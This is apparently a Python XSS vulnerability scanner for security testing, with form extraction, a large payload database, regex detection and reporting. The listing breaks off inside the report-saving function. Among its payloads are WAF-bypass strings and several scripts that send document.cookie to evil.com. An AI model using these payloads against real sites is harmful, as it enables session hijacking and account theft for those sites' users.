#!/usr/bin/env python3
"""
Advanced XSS Scanner - OWASP ZAP Style
======================================

A comprehensive Cross-Site Scripting (XSS) vulnerability scanner
similar to OWASP ZAP, written in Python using requests and BeautifulSoup.

Features:
- Automatic form detection and analysis
- Comprehensive XSS payload database
- DOM-based XSS detection
- Reflected XSS detection
- Stored XSS detection
- Advanced evasion techniques
- Detailed vulnerability reporting
- Output logging to file

Author: AI Assistant
Version: 1.0
License: MIT
"""

import requests
import re
import time
import random
import json
import urllib.parse
import hashlib
import threading
import queue
import logging
import argparse
import sys
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup, Comment
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class XSSPayloadGenerator:
    """
    Comprehensive XSS payload generator with various categories and evasion techniques
    """
    
    def __init__(self):
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(window.location)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=confirm('XSS')>",
            "<img src=x onerror=prompt('XSS')>",
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
            "<progress onmouseover=alert('XSS')>",
        ]
        
        self.advanced_payloads = [
            "javascript:alert('XSS')",
            "javascript:alert(1)",
            "javascript:confirm('XSS')",
            "javascript:prompt('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>setTimeout('alert(\"XSS\")',100)</script>",
            "<script>setInterval('alert(\"XSS\")',1000)</script>",
            "<script>Function('alert(\"XSS\")')();</script>",
            "<script>(function(){alert('XSS')})();</script>",
            "<script>new Function('alert(\"XSS\")')();</script>",
            "<script>top.alert('XSS')</script>",
            "<script>parent.alert('XSS')</script>",
            "<script>self.alert('XSS')</script>",
            "<script>this.alert('XSS')</script>",
            "<script>frames.alert('XSS')</script>",
            "<script>content.alert('XSS')</script>",
            "<script>window['alert']('XSS')</script>",
            "<script>window['al'+'ert']('XSS')</script>",
            "<script>window[String.fromCharCode(97,108,101,114,116)]('XSS')</script>",
            "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
            "<script>document.writeln('<img src=x onerror=alert(\"XSS\")>')</script>",
            "<script>document.body.innerHTML='<img src=x onerror=alert(\"XSS\")>'</script>",
            "<script>document.head.innerHTML+='<style onload=alert(\"XSS\")>'</script>",
        ]
        
        self.evasion_payloads = [
            # Case variations
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>ALERT('XSS')</script>",
            "<Script>Alert('XSS')</Script>",
            
            # Encoding variations
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            
            # Space and tab variations
            "<script >alert('XSS')</script>",
            "<script\t>alert('XSS')</script>",
            "<script\n>alert('XSS')</script>",
            "<script\r>alert('XSS')</script>",
            "<script\f>alert('XSS')</script>",
            "<script\v>alert('XSS')</script>",
            
            # Null byte injection
            "<script\x00>alert('XSS')</script>",
            "<img\x00 src=x onerror=alert('XSS')>",
            
            # Comment injection
            "<script><!--alert('XSS')--></script>",
            "<script>/*alert('XSS')*/</script>",
            "<script>//alert('XSS')\nalert('XSS')</script>",
            
            # String concatenation
            "<script>alert('X'+'SS')</script>",
            "<script>alert('X'+'S'+'S')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # Double encoding
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "%2527%253E%253Cscript%253Ealert('XSS')%253C/script%253E",
            
            # Unicode variations
            "<script>alert('\\u0058\\u0053\\u0053')</script>",
            "<script>alert('\\x58\\x53\\x53')</script>",
            
            # Broken tags
            "<script",
            "<script/>alert('XSS')",
            "</script><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert('XSS');var a='",
            "\";alert('XSS');var a=\"",
        ]
        
        self.context_specific_payloads = {
            'input': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
                "\" onfocus=\"alert('XSS')\" autofocus=\"",
                "' onfocus='alert(\"XSS\")' autofocus='",
                "\" onblur=\"alert('XSS')\"",
                "' onblur='alert(\"XSS\")'",
                "\" onchange=\"alert('XSS')\"",
                "' onchange='alert(\"XSS\")'",
                "\" oninput=\"alert('XSS')\"",
                "' oninput='alert(\"XSS\")'",
                "\" onkeydown=\"alert('XSS')\"",
                "' onkeydown='alert(\"XSS\")'",
                "\" onkeyup=\"alert('XSS')\"",
                "' onkeyup='alert(\"XSS\")'",
                "\" onkeypress=\"alert('XSS')\"",
                "' onkeypress='alert(\"XSS\")'",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "\"><img src=x onerror=alert('XSS')>",
                "'><img src=x onerror=alert('XSS')>",
            ],
            'textarea': [
                "</textarea><script>alert('XSS')</script>",
                "</textarea><img src=x onerror=alert('XSS')>",
                "</textarea><svg onload=alert('XSS')>",
                "</textarea><iframe src=javascript:alert('XSS')>",
                "</textarea><body onload=alert('XSS')>",
                "</textarea><details open ontoggle=alert('XSS')>",
                "</textarea><marquee onstart=alert('XSS')>",
                "</textarea><video><source onerror=alert('XSS')>",
                "</textarea><audio src=x onerror=alert('XSS')>",
                "</textarea><keygen onfocus=alert('XSS') autofocus>",
            ],
            'select': [
                "</select><script>alert('XSS')</script>",
                "</select><img src=x onerror=alert('XSS')>",
                "</select><svg onload=alert('XSS')>",
                "</select><iframe src=javascript:alert('XSS')>",
                "</select><body onload=alert('XSS')>",
                "</select><details open ontoggle=alert('XSS')>",
                "</select><marquee onstart=alert('XSS')>",
                "</select><video><source onerror=alert('XSS')>",
                "</select><audio src=x onerror=alert('XSS')>",
                "</select><keygen onfocus=alert('XSS') autofocus>",
            ],
            'url': [
                "javascript:alert('XSS')",
                "javascript:alert(1)",
                "javascript:confirm('XSS')",
                "javascript:prompt('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "vbscript:msgbox('XSS')",
                "livescript:alert('XSS')",
                "mocha:alert('XSS')",
                "charset:alert('XSS')",
            ]
        }
        
        self.dom_payloads = [
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>document.location='http://evil.com/steal.php?data='+escape(document.cookie)</script>",
            "<script>new Image().src='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>fetch('http://evil.com/steal.php?cookie='+document.cookie)</script>",
            "<script>navigator.sendBeacon('http://evil.com/steal.php',document.cookie)</script>",
            "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://evil.com/steal.php?cookie='+document.cookie);xhr.send()</script>",
            "<script>window.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>top.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>parent.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>self.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
        ]
        
        self.polyglot_payloads = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"--></style></script><svg onload=alert(1)>",
            "\";alert(1);t=\"",
            "';alert(1);t='",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<script>alert(1)</script>",
            "<script src=data:,alert(1)>",
            "<script src=//evil.com></script>",
            "<link rel=import href=//evil.com>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
            "<form><button formaction=javascript:alert(1)>Click",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<applet code=javascript:alert(1)>",
            "<marquee onstart=alert(1)>",
        ]
        
        self.waf_bypass_payloads = [
            # Filter bypass attempts
            "<script>al\\u0065rt('XSS')</script>",
            "<script>\\u0061lert('XSS')</script>",
            "<script>eval('\\x61lert(\\x22XSS\\x22)')</script>",
            "<script>Function('return al'+'ert')()('XSS')</script>",
            "<script>[].constructor.constructor('alert(\"XSS\")')();</script>",
            "<script>top['al'+'ert']('XSS')</script>",
            "<script>top[8680439..toString(30)]('XSS')</script>",
            "<script>(alert)(1)</script>",
            "<script>a=alert;a('XSS')</script>",
            "<script>eval.call(null,'alert(\"XSS\")')</script>",
            "<script>Function.prototype.call.call(alert,null,'XSS')</script>",
            "<script>setTimeout(alert,0,'XSS')</script>",
            "<script>setInterval(alert,0,'XSS')</script>",
            "<script>requestAnimationFrame(x=>alert('XSS'))</script>",
            "<script>Promise.resolve().then(()=>alert('XSS'))</script>",
            
            # HTML entity bypass
            "<script>&#97;&#108;&#101;&#114;&#116;('XSS')</script>",
            "<script>&#x61;&#x6c;&#x65;&#x72;&#x74;('XSS')</script>",
            
            # Mixed case bypass
            "<ScRiPt>AlErT('XSS')</ScRiPt>",
            "<SCRIPT>ALERT('XSS')</SCRIPT>",
            
            # Whitespace bypass
            "<script\x09>alert('XSS')</script>",
            "<script\x0A>alert('XSS')</script>",
            "<script\x0C>alert('XSS')</script>",
            "<script\x0D>alert('XSS')</script>",
            "<script\x20>alert('XSS')</script>",
            
            # Comment bypass
            "<script><!--//-->alert('XSS')</script>",
            "<script><!--//--><![CDATA[//><!--]]>alert('XSS')</script>",
            
            # Alternative tags
            "<svg><script>alert('XSS')</script></svg>",
            "<math><script>alert('XSS')</script></math>",
            "<table background=javascript:alert('XSS')>",
            "<img src=\"javascript:alert('XSS')\">",
            "<img src=`javascript:alert('XSS')`>",
            "<img src='javascript:alert(\"XSS\")'>",
            
            # Event handler bypass
            "<img/src/onerror=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onError=alert('XSS')>",
            "<img src=x ONERROR=alert('XSS')>",
            "<img src=x OnErRoR=alert('XSS')>",
            
            # Protocol bypass
            "javascript&#58;alert('XSS')",
            "javascript&colon;alert('XSS')",
            "javascript&#x3A;alert('XSS')",
            "javascript&#x003A;alert('XSS')",
            "java\\u0073cript:alert('XSS')",
            "java\\x73cript:alert('XSS')",
            
            # Double encoding
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "%2522%253E%253Cscript%253Ealert('XSS')%253C/script%253E",
            
            # Alternative quotes
            "<script>alert(`XSS`)</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert('XS'+'S')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # Template literals
            "<script>alert`XSS`</script>",
            "<script>`${alert`XSS`}`</script>",
            "<script>(()=>alert`XSS`)()</script>",
        ]
    
    def get_all_payloads(self):
        """Return all payloads combined"""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.advanced_payloads)
        all_payloads.extend(self.evasion_payloads)
        all_payloads.extend(self.dom_payloads)
        all_payloads.extend(self.polyglot_payloads)
        all_payloads.extend(self.waf_bypass_payloads)
        
        # Add context specific payloads
        for context, payloads in self.context_specific_payloads.items():
            all_payloads.extend(payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_context_payloads(self, context):
        """Get payloads specific to a context"""
        if context in self.context_specific_payloads:
            return self.context_specific_payloads[context]
        return self.basic_payloads
    
    def generate_custom_payload(self, field_name, field_type):
        """Generate custom payload based on field characteristics"""
        payloads = []
        
        # Basic payload with field name
        payloads.append(f"<script>alert('{field_name}_XSS')</script>")
        
        # Field type specific payloads
        if field_type == 'email':
            payloads.extend([
                "test@evil.com<script>alert('XSS')</script>",
                "test+<script>alert('XSS')</script>@evil.com",
                "\"<script>alert('XSS')</script>\"@evil.com",
            ])
        elif field_type == 'url':
            payloads.extend([
                "javascript:alert('XSS')",
                "http://evil.com<script>alert('XSS')</script>",
                "https://evil.com?<script>alert('XSS')</script>",
            ])
        elif field_type == 'number':
            payloads.extend([
                "1<script>alert('XSS')</script>",
                "1\" onmouseover=\"alert('XSS')\"",
                "1' onmouseover='alert(\"XSS\")'",
            ])
        elif field_type == 'tel':
            payloads.extend([
                "+1<script>alert('XSS')</script>",
                "123-456-7890<script>alert('XSS')</script>",
                "(123) 456-7890<script>alert('XSS')</script>",
            ])
        elif field_type == 'date':
            payloads.extend([
                "2023-01-01<script>alert('XSS')</script>",
                "01/01/2023<script>alert('XSS')</script>",
            ])
        
        return payloads

class FormExtractor:
    """
    Advanced form extraction and analysis class
    """
    
    def __init__(self, session):
        self.session = session
        self.forms = []
        
    def extract_forms(self, url, html_content):
        """Extract all forms from HTML content"""
        soup = BeautifulSoup(html_content, 'html.parser')
        forms = soup.find_all('form')
        
        extracted_forms = []
        
        for i, form in enumerate(forms):
            form_data = {
                'index': i,
                'action': self._get_form_action(form, url),
                'method': self._get_form_method(form),
                'inputs': self._extract_form_inputs(form),
                'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
                'id': form.get('id', f'form_{i}'),
                'name': form.get('name', f'form_{i}'),
                'class': form.get('class', []),
                'raw_html': str(form),
                'csrf_tokens': self._find_csrf_tokens(form),
                'hidden_inputs': self._find_hidden_inputs(form),
                'file_uploads': self._find_file_uploads(form),
                'javascript_handlers': self._find_javascript_handlers(form),
            }
            extracted_forms.append(form_data)
        
        return extracted_forms
    
    def _get_form_action(self, form, base_url):
        """Get absolute form action URL"""
        action = form.get('action', '')
        if not action:
            return base_url
        return urljoin(base_url, action)
    
    def _get_form_method(self, form):
        """Get form method (GET or POST)"""
        return form.get('method', 'GET').upper()
    
    def _extract_form_inputs(self, form):
        """Extract all input fields from form"""
        inputs = []
        
        # Find all input elements
        input_elements = form.find_all(['input', 'textarea', 'select'])
        
        for element in input_elements:
            input_data = {
                'tag': element.name,
                'type': element.get('type', 'text'),
                'name': element.get('name', ''),
                'id': element.get('id', ''),
                'value': element.get('value', ''),
                'placeholder': element.get('placeholder', ''),
                'required': element.has_attr('required'),
                'disabled': element.has_attr('disabled'),
                'readonly': element.has_attr('readonly'),
                'maxlength': element.get('maxlength', ''),
                'minlength': element.get('minlength', ''),
                'pattern': element.get('pattern', ''),
                'autocomplete': element.get('autocomplete', ''),
                'class': element.get('class', []),
                'attributes': dict(element.attrs),
            }
            
            # Handle select options
            if element.name == 'select':
                options = element.find_all('option')
                input_data['options'] = [
                    {
                        'value': opt.get('value', ''),
                        'text': opt.get_text(strip=True),
                        'selected': opt.has_attr('selected')
                    }
                    for opt in options
                ]
            
            # Handle textarea content
            if element.name == 'textarea':
                input_data['content'] = element.get_text(strip=True)
            
            inputs.append(input_data)
        
        return inputs
    
    def _find_csrf_tokens(self, form):
        """Find potential CSRF tokens in form"""
        csrf_patterns = [
            'csrf', 'token', '_token', 'authenticity_token',
            'csrfmiddlewaretoken', '__RequestVerificationToken',
            'anti_forgery_token', 'form_token'
        ]
        
        csrf_tokens = []
        inputs = form.find_all('input', type='hidden')
        
        for input_elem in inputs:
            name = input_elem.get('name', '').lower()
            for pattern in csrf_patterns:
                if pattern in name:
                    csrf_tokens.append({
                        'name': input_elem.get('name'),
                        'value': input_elem.get('value', ''),
                        'pattern_matched': pattern
                    })
                    break
        
        return csrf_tokens
    
    def _find_hidden_inputs(self, form):
        """Find all hidden input fields"""
        hidden_inputs = []
        inputs = form.find_all('input', type='hidden')
        
        for input_elem in inputs:
            hidden_inputs.append({
                'name': input_elem.get('name', ''),
                'value': input_elem.get('value', ''),
                'id': input_elem.get('id', ''),
            })
        
        return hidden_inputs
    
    def _find_file_uploads(self, form):
        """Find file upload fields"""
        file_inputs = form.find_all('input', type='file')
        return [
            {
                'name': inp.get('name', ''),
                'accept': inp.get('accept', ''),
                'multiple': inp.has_attr('multiple'),
            }
            for inp in file_inputs
        ]
    
    def _find_javascript_handlers(self, form):
        """Find JavaScript event handlers in form"""
        js_events = [
            'onsubmit', 'onclick', 'onchange', 'oninput', 'onfocus',
            'onblur', 'onkeydown', 'onkeyup', 'onkeypress', 'onmouseover',
            'onmouseout', 'onload', 'onerror'
        ]
        
        handlers = []
        
        # Check form element itself
        for event in js_events:
            if form.has_attr(event):
                handlers.append({
                    'element': 'form',
                    'event': event,
                    'handler': form.get(event)
                })
        
        # Check all child elements
        all_elements = form.find_all(True)
        for element in all_elements:
            for event in js_events:
                if element.has_attr(event):
                    handlers.append({
                        'element': element.name,
                        'event': event,
                        'handler': element.get(event),
                        'element_id': element.get('id', ''),
                        'element_name': element.get('name', ''),
                    })
        
        return handlers

class XSSDetector:
    """
    Advanced XSS vulnerability detection engine
    """
    
    def __init__(self, session, payload_generator):
        self.session = session
        self.payload_generator = payload_generator
        self.detection_patterns = self._compile_detection_patterns()
        self.false_positive_patterns = self._compile_false_positive_patterns()
        
    def _compile_detection_patterns(self):
        """Compile regex patterns for XSS detection"""
        patterns = [
            # Basic script execution
            re.compile(r'<script[^>]*>.*?alert\s*\([^)]*\).*?</script>', re.IGNORECASE | re.DOTALL),
            re.compile(r'<script[^>]*>.*?confirm\s*\([^)]*\).*?</script>', re.IGNORECASE | re.DOTALL),
            re.compile(r'<script[^>]*>.*?prompt\s*\([^)]*\).*?</script>', re.IGNORECASE | re.DOTALL),
            
            # Event handlers
            re.compile(r'on\w+\s*=\s*["\']?[^"\']*alert\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'on\w+\s*=\s*["\']?[^"\']*confirm\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'on\w+\s*=\s*["\']?[^"\']*prompt\s*\([^)]*\)', re.IGNORECASE),
            
            # JavaScript URLs
            re.compile(r'javascript:\s*alert\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'javascript:\s*confirm\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'javascript:\s*prompt\s*\([^)]*\)', re.IGNORECASE),
            
            # Data URLs
            re.compile(r'data:text/html[^>]*<script[^>]*>.*?alert\s*\([^)]*\)', re.IGNORECASE | re.DOTALL),
            
            # SVG vectors
            re.compile(r'<svg[^>]*onload\s*=\s*["\']?[^"\']*alert\s*\([^)]*\)', re.IGNORECASE),
            
            # IMG vectors
            re.compile(r'<img[^>]*onerror\s*=\s*["\']?[^"\']*alert\s*\([^)]*\)', re.IGNORECASE),
            
            # IFRAME vectors
            re.compile(r'<iframe[^>]*src\s*=\s*["\']?javascript:[^"\']*alert\s*\([^)]*\)', re.IGNORECASE),
            
            # Generic HTML injection
            re.compile(r'<[^>]*\s+on\w+\s*=\s*["\']?[^"\']*(?:alert|confirm|prompt)\s*\([^)]*\)', re.IGNORECASE),
            
            # Expression evaluation
            re.compile(r'eval\s*\(\s*["\']?[^"\']*(?:alert|confirm|prompt)\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'Function\s*\(\s*["\']?[^"\']*(?:alert|confirm|prompt)\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'setTimeout\s*\(\s*["\']?[^"\']*(?:alert|confirm|prompt)\s*\([^)]*\)', re.IGNORECASE),
            re.compile(r'setInterval\s*\(\s*["\']?[^"\']*(?:alert|confirm|prompt)\s*\([^)]*\)', re.IGNORECASE),
        ]
        
        return patterns
    
    def _compile_false_positive_patterns(self):
        """Compile patterns that indicate false positives"""
        patterns = [
            # Escaped content
            re.compile(r'&lt;script&gt;.*?&lt;/script&gt;', re.IGNORECASE),
            re.compile(r'\\u003cscript\\u003e.*?\\u003c/script\\u003e', re.IGNORECASE),
            re.compile(r'%3Cscript%3E.*?%3C/script%3E', re.IGNORECASE),
            
            # Content within comments
            re.compile(r'<!--.*?<script[^>]*>.*?</script>.*?-->', re.IGNORECASE | re.DOTALL),
            
            # Content within CDATA
            re.compile(r'<!\[CDATA\[.*?<script[^>]*>.*?</script>.*?\]\]>', re.IGNORECASE | re.DOTALL),
            
            # Content within textarea or pre tags (unless it's breaking out)
            re.compile(r'<textarea[^>]*>.*?<script[^>]*>.*?</script>.*?</textarea>', re.IGNORECASE | re.DOTALL),
            re.compile(r'<pre[^>]*>.*?<script[^>]*>.*?</script>.*?</pre>', re.IGNORECASE | re.DOTALL),
        ]
        
        return patterns
    
    def detect_xss(self, response_content, payload):
        """Detect XSS vulnerability in response content"""
        # Check if payload is reflected in response
        if payload not in response_content:
            return False, "Payload not reflected"
        
        # Check for false positives first
        for pattern in self.false_positive_patterns:
            if pattern.search(response_content):
                return False, "Payload appears to be escaped or in safe context"
        
        # Check for XSS patterns
        for pattern in self.detection_patterns:
            match = pattern.search(response_content)
            if match:
                return True, f"XSS detected: {match.group()[:100]}..."
        
        # Additional context-specific checks
        if self._check_dom_xss_indicators(response_content, payload):
            return True, "Potential DOM-based XSS detected"
        
        if self._check_attribute_injection(response_content, payload):
            return True, "Attribute injection XSS detected"
        
        if self._check_javascript_context(response_content, payload):
            return True, "JavaScript context XSS detected"
        
        return False, "No XSS pattern detected despite payload reflection"
    
    def _check_dom_xss_indicators(self, content, payload):
        """Check for DOM-based XSS indicators"""
        dom_indicators = [
            'document.write',
            'document.writeln',
            'innerHTML',
            'outerHTML',
            'document.location',
            'window.location',
            'location.href',
            'location.search',
            'location.hash',
            'eval(',
            'setTimeout(',
            'setInterval(',
            'Function(',
        ]
        
        # Check if payload appears near DOM manipulation functions
        for indicator in dom_indicators:
            if indicator in content and payload in content:
                # Check if they appear close to each other
                indicator_pos = content.find(indicator)
                payload_pos = content.find(payload)
                if abs(indicator_pos - payload_pos) < 200:  # Within 200 characters
                    return True
        
        return False
    
    def _check_attribute_injection(self, content, payload):
        """Check for attribute injection XSS"""
        # Look for payload inside HTML attributes
        attribute_patterns = [
            rf'<[^>]+{re.escape(payload)}[^>]*>',
            rf'<[^>]+\s+\w+\s*=\s*["\']?[^"\']*{re.escape(payload)}[^"\']*["\']?[^>]*>',
        ]
        
        for pattern in attribute_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def _check_javascript_context(self, content, payload):
        """Check for XSS in JavaScript context"""
        # Look for payload inside script tags or JavaScript contexts
        js_patterns = [
            rf'<script[^>]*>.*?{re.escape(payload)}.*?</script>',
            rf'javascript:[^"\']*{re.escape(payload)}',
            rf'on\w+\s*=\s*["\']?[^"\']*{re.escape(payload)}',
        ]
        
        for pattern in js_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                return True
        
        return False
    
    def analyze_response_context(self, content, payload):
        """Analyze the context where payload appears in response"""
        contexts = []
        
        # Find all occurrences of payload
        payload_positions = []
        start = 0
        while True:
            pos = content.find(payload, start)
            if pos == -1:
                break
            payload_positions.append(pos)
            start = pos + 1
        
        for pos in payload_positions:
            # Get surrounding context (100 chars before and after)
            context_start = max(0, pos - 100)
            context_end = min(len(content), pos + len(payload) + 100)
            context = content[context_start:context_end]
            
            # Determine context type
            context_type = self._determine_context_type(context, payload)
            contexts.append({
                'position': pos,
                'context': context,
                'type': context_type,
                'surrounding': {
                    'before': content[max(0, pos - 50):pos],
                    'after': content[pos + len(payload):pos + len(payload) + 50]
                }
            })
        
        return contexts
    
    def _determine_context_type(self, context, payload):
        """Determine the type of context where payload appears"""
        payload_pos = context.find(payload)
        before = context[:payload_pos].lower()
        after = context[payload_pos + len(payload):].lower()
        
        # Check various contexts
        if '<script' in before and '</script>' in after:
            return 'script_content'
        elif 'javascript:' in before:
            return 'javascript_url'
        elif re.search(r'on\w+\s*=\s*["\']?[^"\']*$', before):
            return 'event_handler'
        elif '<style' in before and '</style>' in after:
            return 'css_content'
        elif '<!--' in before and '-->' in after:
            return 'html_comment'
        elif '<' in before and '>' in after:
            if re.search(r'\w+\s*=\s*["\']?[^"\']*$', before):
                return 'attribute_value'
            else:
                return 'tag_content'
        elif re.search(r'<(input|textarea|select)', before, re.IGNORECASE):
            return 'form_field'
        else:
            return 'html_content'

class VulnerabilityReporter:
    """
    Comprehensive vulnerability reporting and output management
    """
    
    def __init__(self, output_file='output.txt'):
        self.output_file = output_file
        self.vulnerabilities = []
        self.scan_stats = {
            'start_time': None,
            'end_time': None,
            'total_forms': 0,
            'total_payloads': 0,
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'false_positives': 0,
            'errors': 0,
        }
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('xss_scanner.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def add_vulnerability(self, vuln_data):
        """Add a vulnerability to the report"""
        vuln_data['timestamp'] = datetime.now().isoformat()
        vuln_data['id'] = hashlib.md5(
            f"{vuln_data['url']}{vuln_data['form_id']}{vuln_data['parameter']}{vuln_data['payload']}".encode()
        ).hexdigest()[:8]
        
        self.vulnerabilities.append(vuln_data)
        self.scan_stats['vulnerabilities_found'] += 1
        
        # Log critical finding
        self.logger.critical(f"XSS VULNERABILITY FOUND: {vuln_data['url']} - {vuln_data['parameter']}")
    
    def print_vulnerability_summary(self):
        """Print a summary of found vulnerabilities"""
        if not self.vulnerabilities:
            print(f"\n{Colors.GREEN}[INFO] No XSS vulnerabilities found.{Colors.END}")
            return
        
        print(f"\n{Colors.RED}{Colors.BOLD}[CRITICAL] XSS VULNERABILITIES FOUND!{Colors.END}")
        print(f"{Colors.RED}{'='*60}{Colors.END}")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{Colors.RED}{Colors.BOLD}Vulnerability #{i}:{Colors.END}")
            print(f"{Colors.YELLOW}URL:{Colors.END} {vuln['url']}")
            print(f"{Colors.YELLOW}Form ID:{Colors.END} {vuln['form_id']}")
            print(f"{Colors.YELLOW}Parameter:{Colors.END} {vuln['parameter']}")
            print(f"{Colors.YELLOW}Method:{Colors.END} {vuln['method']}")
            print(f"{Colors.YELLOW}Payload:{Colors.END} {vuln['payload'][:100]}...")
            print(f"{Colors.YELLOW}Detection:{Colors.END} {vuln['detection_reason']}")
            print(f"{Colors.YELLOW}Risk Level:{Colors.END} {vuln['risk_level']}")
            print(f"{Colors.YELLOW}Confidence:{Colors.END} {vuln['confidence']}")
            
            if vuln.get('contexts'):
                print(f"{Colors.YELLOW}Contexts:{Colors.END}")
                for ctx in vuln['contexts'][:3]:  # Show first 3 contexts
                    print(f"  - {ctx['type']}: {ctx['context'][:80]}...")
            
            print(f"{Colors.RED}{'-'*40}{Colors.END}")
    
    def generate_detailed_report(self):
        """Generate detailed vulnerability report"""
        report = {
            'scan_info': {
                'scanner': 'Advanced XSS Scanner v1.0',
                'scan_date': datetime.now().isoformat(),
                'duration': self._calculate_scan_duration(),
                'statistics': self.scan_stats
            },
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['risk_level'] == 'Critical']),
                'high': len([v for v in self.vulnerabilities if v['risk_level'] == 'High']),
                'medium': len([v for v in self.vulnerabilities if v['risk_level'] == 'Medium']),
                'low': len([v for v in self.vulnerabilities if v['risk_level'] == 'Low']),
            }
        }
        
        return report
    
    def save_to_file(self):
        """Save detailed report to output file"""
        report = self.generate_detailed_report()
        
        try:
            with open(self.output_file, 'w', encoding='utf-8') as f:
                # Write header
                f.write("="*80 + "\n")
                f.write("ADVANCED XSS SCANNER REPORT\n")
                f.write("="*80 + "\n\n")
                
                # Write scan information
                f.write("SCAN INFORMATION:\n")
                f.write("-"*40 + "\n")
                f.write(f"Scanner: {report['scan_info']['scanner']}\n")
                f.write(f"Scan Date: {report['scan_info']['scan_date']}\n")
                f.write(f"Duration: {report['scan_info']['duration']}\n")
                f.write(f"Total Forms Scanned: {report['scan_info']['statistics']['total_forms']}\n")
                f.write(f"Total Payloads Tested: {report['scan_info']['statistics']['total_payloads']}\n")
                f.write(f"Total Requests Made: {report['scan_info']['statistics']['total_requests']}\n")
                f.write(f"Vulnerabilities Found: {report['scan_info']['statistics']['vulnerabilities_found']}\n")
                f.write(f"Errors Encountered: {report['scan_info']['statistics']['errors']}\n\n")
                
                # Write summary
                f.write("VULNERABILITY SUMMARY:\n")
                f.write("-"*40 + "\n")
